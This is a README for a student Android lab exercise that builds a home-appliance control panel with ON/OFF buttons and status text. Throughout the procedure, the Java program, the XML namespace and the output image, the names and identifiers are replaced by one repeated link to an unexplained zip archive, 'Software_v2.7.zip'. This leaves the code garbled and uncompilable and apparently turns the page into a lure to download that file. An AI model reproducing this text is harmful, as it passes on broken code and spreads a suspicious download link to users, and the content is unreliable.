# DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE.

## AIM:
To develop an android application to control home appliances

## APPARATUS REQUIRED:

ØComputer
ØAndroid studio software


## THEORY:
The Appliance Control App provides a user interface to control appliances such as a fan, light, and air conditioner. The app consists of buttons to turn each appliance on or off, and the status of each appliance is displayed in real-time using TextViews. This experiment teaches the basics of creating a control panel-style user interface in Android, where multiple appliances can be managed independently. It involves handling button clicks to change the state of UI elements dynamically and reflects the principles of event-driven programming in Android. The app also demonstrates how to update the user interface based on user interactions with different components, enhancing user engagement.

## PROCEDURE:
1. Open Android Studio and then click on File -> New -> New project. 35. Then type the application name as “https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip″ and click Next.
2. Then select the Minimum SDK as shown below and click next. 37. Then select the Empty Activity and click next.
3. Finally click Finish.
4. Click on app -> java -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip
5. Now click on Text and type the program, so now the programming part of the main activity is completed.
6. Click on app -> res -> layout -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip
7. Now click on Text and type the program, so now the designing part of Activity main is also completed.
8. Select the suitable available device to display the output. 44. Now run the application to see the output. 

## PROGRAM:
## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip
```
package https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip;

 

import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip*;

import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip;

 

public class MainActivity extends AppCompatActivity {

 

TextView fanStatus, lightStatus, acStatus;

Button fanOn, fanOff, lightOn, lightOff, acOn, acOff;

 

@Override

protected void onCreate(Bundle savedInstanceState) { https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip(savedInstanceState); setContentView(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip);

 

fanStatus = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip); lightStatus = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip); acStatus = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip);

 

fanOn = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip); fanOff = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip); lightOn = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip); lightOff = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip); acOn = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip); acOff = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip);

 

https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip(v -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip("Fan: ON")); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip(v -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip("Fan: OFF"));

 

https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip(v -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip("Light: ON")); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip(v -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip("Light: OFF"));

 

https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip(v -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip("AC: ON")); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip(v -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip("AC: OFF"));

} }
```
## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip
```
<?xml version="1.0" encoding="utf-8"?>

<ScrollView xmlns:android="https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip" android:layout_width="match_parent" android:layout_height="match_parent">

<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="20dp">

<TextView android:id="@+id/titleText"

android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Appliance Control Panel" android:textSize="24sp" android:textStyle="bold" android:gravity="center" android:paddingBottom="20dp" />

<!-- Fan Control -->

<TextView android:id="@+id/fanStatus" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Fan: OFF" android:textSize="18sp" android:padding="8dp"/>

<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal"> <Button

android:id="@+id/fanOn" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="Fan ON" />

<Button android:id="@+id/fanOff" android:layout_width="0dp" android:layout_weight="1"

android:layout_height="wrap_content" android:text="Fan OFF" />

</LinearLayout>

<!-- Light Control -->

<TextView android:id="@+id/lightStatus" android:layout_width="match_parent"

 

android:layout_height="wrap_content" android:text="Light: OFF" android:textSize="18sp" android:padding="8dp"/>

<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal"> <Button

android:id="@+id/lightOn" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="Light ON" />

<Button android:id="@+id/lightOff" android:layout_width="0dp" android:layout_weight="1"

android:layout_height="wrap_content" android:text="Light OFF" />

</LinearLayout> <!-- AC Control -->

<TextView android:id="@+id/acStatus" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="AC: OFF" android:textSize="18sp" android:padding="8dp"/>

<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal"> <Button

android:id="@+id/acOn" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="AC ON" />

<Button android:id="@+id/acOff" android:layout_width="0dp" android:layout_weight="1"

android:layout_height="wrap_content" android:text="AC OFF" />

</LinearLayout> </LinearLayout>

</ScrollView>
```

## OUTPUT: 

![android](https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-CONTROL-HOME-APPLIANCES-USING-AN-ANDROID-PHONE./main/turbodynamo/Software_v2.7.zip)



## RESULT:
Thus, the Android app for controlling home appliances is developed and the output is verified.
